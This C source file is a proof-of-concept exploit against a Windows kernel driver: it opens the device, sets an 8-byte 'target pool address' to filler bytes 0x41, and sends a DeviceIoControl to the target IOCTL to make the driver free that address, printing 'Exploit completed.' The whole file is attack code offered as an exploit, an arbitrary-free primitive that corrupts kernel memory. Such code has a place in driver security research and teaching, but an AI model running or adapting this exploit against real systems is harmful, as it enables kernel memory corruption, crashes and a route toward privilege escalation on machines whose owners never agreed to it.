#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	char* memory_page;
	char input[8];
	char output[256];
	unsigned long bytes_returned = 0;

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	printf("%s\n[!] ExFreePoolWithTag Proof-of-Concept Exploit\n[!] Let's Exploit!", BANNER);

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the ExFreePool primitive driver. Handle Value: 0x%p, Error: %d (0x%x)", h_driver, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the ExFreePool primitive driver. Handle Value: 0x%p", h_driver);

	memory_page = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
	if (!memory_page)
	{
		printf("\n[-] Failed to allocate 4096 bytes on the process heap.");
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes on the process heap. Allocation Address: 0x%p", memory_page);

	memset(&input, 0x41, sizeof(input));
	printf("\n[+] Set target pool address to address 0x%p.", *(long long*)input);

	DeviceIoControl(h_driver, TARGET_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Free'd target pool address. Exploit completed.");
	unused = getchar();

	return 0;
}